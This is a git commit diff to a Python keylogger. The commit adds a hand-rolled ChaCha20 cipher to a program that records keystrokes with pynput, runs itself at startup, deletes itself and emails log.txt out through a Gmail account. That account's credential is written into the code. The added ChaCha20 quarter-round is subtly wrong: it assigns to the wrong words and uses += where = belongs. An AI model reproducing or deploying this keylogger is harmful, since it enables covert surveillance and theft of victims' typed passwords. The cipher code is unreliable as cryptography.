90939e8e1bdb92d3d3002d8a74a7255839409195
Zovin Anggleas <anggleaszovin@gmail.com>
2025-07-27 07:41:23 +1000

    added ChaCha20 encryption to keylogger

--- keylogger.py
+++ keylogger.py
@@ -3,11 +3,18 @@ from pynput import keyboard
 # from watchdog.events import FileSystemEventHandler
 import os, sys, time, subprocess
 
-import smtplib
-from email.mime.application import MIMEApplication
-from email.mime.multipart import MIMEMultipart
-from email.mime.text import MIMEText
-from email.utils import COMMASPACE, formatdate
+# key for ChaCha20
+key = [
+    0x03020100,
+    0x07060504,
+    0x0b0a0908,
+    0x0f0e0d0c,
+    0x13121110,
+    0x17161514,
+    0x1b1a1918,
+    0x1f1e1d1c
+]
+block = 0
 
 def delete_self():
     path_exe = os.path.realpath(sys.argv[0])  # get absolute path to exe file
@@ -56,11 +63,77 @@ def send_email():
         return
     
     yag = yagmail.SMTP('xanofoxewa20@gmail.com', 'bvez hsnw ptsr isdd ')
-    yag.send('zovinang@gmail.com', 'test send email', contents = 'hi', attachments = "log.txt")
+    yag.send('example_email@gmail.com', 'test send email', contents = 'hi', attachments = "log.txt")
 
     # clears file
     with open("log.txt", "w") as file:
         pass
+
+def rotate_left(value, shift):
+    return ((value << shift) & 0xFFFFFFFF) | (value >> (32 - shift))
+
+def quarter_round(matrix, a, b, c, d):
+    # column round
+    matrix[a] = (matrix[a] + matrix[b]) & 0xFFFFFFFF
+    matrix[d] ^= matrix[a]
+    matrix[d] = rotate_left(matrix[d], 16)
+
+    matrix[a] = (matrix[c] + matrix[d]) & 0xFFFFFFFF
+    matrix[b] ^= matrix[c]
+    matrix[b] = rotate_left(matrix[b], 12)
+
+    # diagonal round
+    matrix[a] += (matrix[a] + matrix[b]) & 0xFFFFFFFF
+    matrix[d] ^= matrix[a]
+    matrix[d] = rotate_left(matrix[d], 8)
+
+    matrix[c] += (matrix[c] + matrix[d]) & 0xFFFFFFFF
+    matrix[b] ^= matrix[c]
+    matrix[b] = rotate_left(matrix[b], 7)
+
+
+def ChaCha20(nonce):
+    matrix = [0] * 16
+    matrix[0] = 0x61707865
+    matrix[1] = 0x3320646e
+    matrix[2] = 0x79622d32
+    matrix[3] = 0x6b206574
+
+    # populate the matrix with keys
+    for i, word in enumerate(key):
+        matrix[4+i] = word
+
+    matrix[12] = block
+    matrix[13] = nonce[0]
+    matrix[14] = nonce[1]
+    matrix[15] = nonce[2]
+
+    original_matrix = matrix.copy()
+
+    # only 10 times because every loop is doing 
+    # 1 column round and 1 diagonal round
+    for i in range(10):
+        quarter_round(matrix,  0,  4,  8, 12)
+        quarter_round(matrix,  1,  5,  9, 13)
+        quarter_round(matrix,  2,  6, 10, 14)
+        quarter_round(matrix,  3,  7, 11, 15)
+        quarter_round(matrix,  0,  5, 10, 15)
+        quarter_round(matrix,  1,  6, 11, 12)
+        quarter_round(matrix,  2,  7,  8, 13)
+        quarter_round(matrix,  3,  4,  9, 14)
+    
+    for i in range(16):
+        matrix[i] = (matrix[i] + original_matrix[i]) & 0xFFFFFFFF
+
+    keystream = []
+    for word in matrix:
+        keystream.append((word) & 0xFF)
+        keystream.append((word >> 8) & 0xFF)
+        keystream.append((word >> 16) & 0xFF)
+        keystream.append((word >> 24) & 0xFF)
+    
+    return keystream
+        
 
 # make program always run at startup
 # taken from : https://stackoverflow.com/questions/65844536/making-python-code-run-at-startup-in-windows
@@ -111,4 +184,3 @@ while (1):
 print("program over")
 
 # https://github.com/skeeto/chacha-js/blob/master/chacha.js encryption
-# https://stackoverflow.com/questions/65844536/making-python-code-run-at-startup-in-windows startup
